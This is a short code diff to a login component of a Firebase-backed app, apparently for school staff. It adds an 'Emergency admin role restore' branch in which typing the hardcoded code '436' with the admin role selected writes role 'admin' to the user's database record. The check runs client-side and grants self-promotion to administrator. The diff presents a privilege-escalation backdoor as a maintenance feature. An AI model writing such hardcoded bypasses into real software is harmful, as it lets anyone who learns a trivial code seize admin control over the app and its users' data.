@@ -102,8 +102,23 @@ export default function Login() {
       const userDocRef = doc(db, 'users', uid);
       const userDocSnap = await getDoc(userDocRef);
       const userData = userDocSnap.exists() ? userDocSnap.data() : {};
-      const firestoreRole: string = userData.role ?? 'teacher';
+      let firestoreRole: string = userData.role ?? 'teacher';
       const firestoreStaffId: string | undefined = userData.staffId;
+
+      // Emergency admin role restore
+      if (selectedRole === 'admin' && secretCode === '436') {
+        localStorage.setItem('isAdminLogin', 'true');
+        if (firestoreRole !== 'admin' && firestoreRole !== 'editor') {
+          firestoreRole = 'admin';
+          try {
+            await setDoc(userDocRef, { role: 'admin' }, { merge: true });
+          } catch (err) {
+            console.error('Failed to restore admin role:', err);
+          }
+        }
+      } else {
+        localStorage.removeItem('isAdminLogin');
+      }
 
       // Step 3: Staff ID Migration / Validation Check
       if (!firestoreStaffId) {
